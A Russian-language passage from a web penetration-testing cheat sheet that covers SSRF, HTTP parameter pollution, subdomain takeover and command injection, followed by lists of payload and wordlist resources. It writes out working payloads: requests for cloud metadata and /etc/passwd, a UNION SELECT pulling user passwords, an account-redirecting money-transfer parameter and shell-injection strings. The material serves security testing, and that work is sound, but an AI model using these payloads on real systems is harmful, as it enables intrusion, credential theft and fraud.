Аналогичным образом, запрос на запрос на стороне сервера (SSRF) можно использовать для запросов на другие внутренние ресурсы, к которым имеет доступ веб-сервер, но не подвергаются публичной проверке. В качестве примера можно получить доступ к метаданным экземпляра экземпляров Amazon EC2 и OpenStack. Эта услуга доступна только для сервера, а не для внешнего мира. Злоумышленник может даже получить креатив с SSRF и запустить сканирование портов во внутренних сетях с помощью этого подхода.

    GET /?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
    Host: example.com

Помимо URL-адресов http: // и https: //, злоумышленник может использовать менее известные или устаревшие схемы URL-адресов для доступа к файлам в локальной или внутренней сети.

Примером такого запроса является использование схемы file:///
    GET /?url=file:///etc/passwd HTTP/1.1
    Host: example.com

Если cURL используются для выполнения запросов можно использовать схему URL-адреса dict, чтобы отправлять запросы любому хосту на любом порту и отправлять пользовательские данные. ( dict://, ftp:// gopher://)

    GET /?url=dict://localhost:11211/stat HTTP/1.1
    Host: example.com

Можно попробовать такой способ
echo -e 'GET @█████/ HTTP/1.1\r\nHost: alerts.newrelic.com\r\n\r\n' | openssl s_client -ign_eof -connect alerts.newrelic.com:443

Обычно увидеть утечку информации можно, используя неполный HTTP-заголовок, например http:// или http://[::]. Конфиденциальная информация включает в себя IP-адрес базы данных, версию базы данных, используемые плагины, ОС, архитектуру ОС, etc.
?consumerUri=http://[::]

```

**HTTP Parameter Pollution**
```
Атака, основным преимуществом которой является возможность обхода WAF (Web Application Firewall)

Передача одного параметра:
    example.com/page.asp?id=VALUE1

Передача нескольких параметров с одним именем:
    example.com/page.asp?id=VALUE1&id=VALUE2

HPP на серверную часть
    http://www.example.com/index.aspx?id=-1+UNION+SELECT+username&id=password+FROM+users–

Ошибка позволила злоумышленникам завладеть блоком жертвы, используя следующий HTTP-запрос:
POST /add-authors.do HTTP/1.1 
security_token=attackertoken&blogID=attackerblogidvalue&blogID=victimblogidvalue&authorsList=goldshlager19test%40gmail.com(attacker email)&ok=Invite

Например: при тестировании параметра search_string в строке запроса URL-адрес запроса будет включать имя и значение параметра.
    http://example.com/?search_string=kittens

Конкретный параметр может быть скрыт среди нескольких других параметров, но подход тот же; оставьте остальные параметры на месте и добавьте дубликат.
    http://example.com/?mode=guest&search_string=kittens&num_results=100

Добавьте тот же параметр с другим значением
    http://example.com/?mode=guest&search_string=kittens&num_results=100&search_string=puppies

HPP на клиентскую часть

    Суть атак на клиента заключается в добавлении дополнительных параметров к ссылкам, различным тэгам, имеющих атрибут src, и к формам (атрибут action)

    http://www.example.com/index.php?param=hpp&action=edit
    <a href=http://www.example.com/index.php?action=view¶m=hpp&amp;action=edit>test</a>

Чтобы протестировать уязвимости на стороне клиента HPP, определите любую форму или действие, которое позволяет вводить пользователя и показывает результат этого ввода пользователю. Поисковая страница идеальна, но окно входа может не работать (так как это может не показать неверное имя пользователя для пользователя).

Подобно серверной HPP, загрязняйте каждый параметр HTTP% 26HPP_TEST и ищите расшифрованные по URL-адресам загружаемую пользователем полезную нагрузку:

&HPP_TEST 
&amp;HPP_TEST
В частности, обратите внимание на ответы, содержащие векторы HPP в атрибутах данных, src, href или действиях форм

Parameter pollution in social sharing buttons

    https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.c
    https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal-and-impact?&u=https://vk.com/durov
    https://hackerone.com/blog/introducing-signal-and-impact?&u=https://vk.com/durov&text=another_site:https://vk.com/durov

Есть сайт https://www.example.com/transferMoney.php, который через метод POST принимает следующие параметры:

    amount=1000&fromAccount=12345

Добавить toAccount

    amount=1000&fromAccount=12345&toAccount=99999

Сайт, уязвимый к HPP атаке передаст запрос бэкенду в таком виде и второй параметр toAccount перезапишет запрос к бэкенду:

    toAccount=9876&amount=1000&fromAccount=12345&toAccount=99999
```

**Subdomain takeover**
```
Висящая запись CNAME datacafe-cert.starbucks.com указывает на s00397nasv101-datacafe-cert.azurewebsites.net, который не был заявлен вами. Я зарегистрировал службу с этим именем и, следовательно, смог захватить поддомен.

Сначала я перечислил разные субдомены для starbucks.com. Затем я проверил, есть ли в этих доменах запись cname, указывающая на azurewebsites.net. Для каждого соответствующего домена я выполнил запрос DNS для записи в записи CNAME. Если это возвращает NXDOMAIN, поддомен обычно может быть принят, и возможно зарегистрировать домен, который соответствует записи NXDOMAIN CNAME.
```

**Удаленное выполнение кода (RCE)**
```
.../index.php?page=1;phpinfo()
https://example.com”|ls “-la   

os-command-injection
https://portswigger.net/web-security/os-command-injection
```

**CheatSheet**
```
Bug Bounty Cheat-sheet
https://github.com/EdOverflow/bugbounty-cheatsheet

Sql-injection
https://portswigger.net/web-security/sql-injection/cheat-sheet
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/

Xss
https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
http://html5sec.org/

Markdown's XSS Vulnerability
https://github.com/showdownjs/showdown/wiki/Markdown's-XSS-Vulnerability-(and-how-to-mitigate-it)

XSS without HTML: Client-Side Template Injection with AngularJS
https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs

Practical Web Cache Poisoning
https://portswigger.net/research/practical-web-cache-poisoning

Bypassing Web Cache Poisoning Countermeasures
https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures

Web-cache-deception-attack
https://bo0om.ru/web-cache-deception-attack

Web-Cache-Deception-Attack
https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf

Web Cache Deception Attack leads to user info disclosure
https://medium.com/@kunal94/web-cache-deception-attack-leads-to-user-info-disclosure-805318f7bb29

HTTP Desync Attacks: Request Smuggling Reborn
https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

XXE Payload
https://gist.github.com/staaldraad/01415b990939494879b4

SSRF
https://github.com/cujanovic/SSRF-Testing

Metasploit
https://www.offensive-security.com/metasploit-unleashed/

Awesome OSINT Cheat-sheet
https://github.com/jivoi/awesome-osint

Awesome Pentest Cheat-sheet
https://github.com/enaqx/awesome-pentest

Awesome Hacking Cheat-sheet
https://github.com/Hack-with-Github/Awesome-Hacking

Awesome-Infosec Cheat-Sheet
https://github.com/onlurking/awesome-infosec

PENTESTING-BIBLE
https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE

Penetration-Testing
https://github.com/jtesta/Penetration-Testing

Pentest Bookmarks
https://github.com/kurobeats/pentest-bookmarks/blob/master/BookmarksList.md

Bugcrowd_university
https://github.com/bugcrowd/bugcrowd_university

This API enables cross-origin requests to anywhere.
https://cors-anywhere.herokuapp.com/
https://hackerone.com/reports/577920

Hacking It Out: When CORS won’t let you be great
https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646


```

**Wordlist**

SecLists (Discovery, Fuzzing, Shell, Directory Hunting, CMS)

danielmiessler - https://github.com/danielmiessler/SecLists

swisskyrepo - https://github.com/swisskyrepo/PayloadsAllTheThings

s0md3v AwesomeXSS - https://github.com/s0md3v/AwesomeXSS

XSS Filter Evasion Cheat Sheet - https://sking7.github.io/articles/218647712.html

xss-payload-list - https://github.com/payloadbox/xss-payload-list

xss_vectors - https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45


cujanovic (CRLF-payloads) - https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt

NickSanzotta -  https://github.com/NickSanzotta/BurpIntruder

shadsidd  - https://github.com/shadsidd

shikari1337 -  https://www.shikari1337.com/list-of-xss-payloads-for-cross-site-scripting/

7ioSecurity  - https://github.com/7ioSecurity/XSS-Payloads

xmendez  - https://github.com/xmendez/wfuzz

minimaxir  - https://github.com/minimaxir/big-list-of-naughty-strings

xsscx  - https://github.com/xsscx/Commodity-Injection-Signatures

TheRook  - https://github.com/TheRook/subbrute

Directory wordlist
https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056

Portable Wordlist
https://github.com/berzerk0/Probable-Wordlists

FUZZ-DB
https://github.com/fuzzdb-project/fuzzdb

Mix-Wordlist
https://github.com/jeanphorn/wordlist
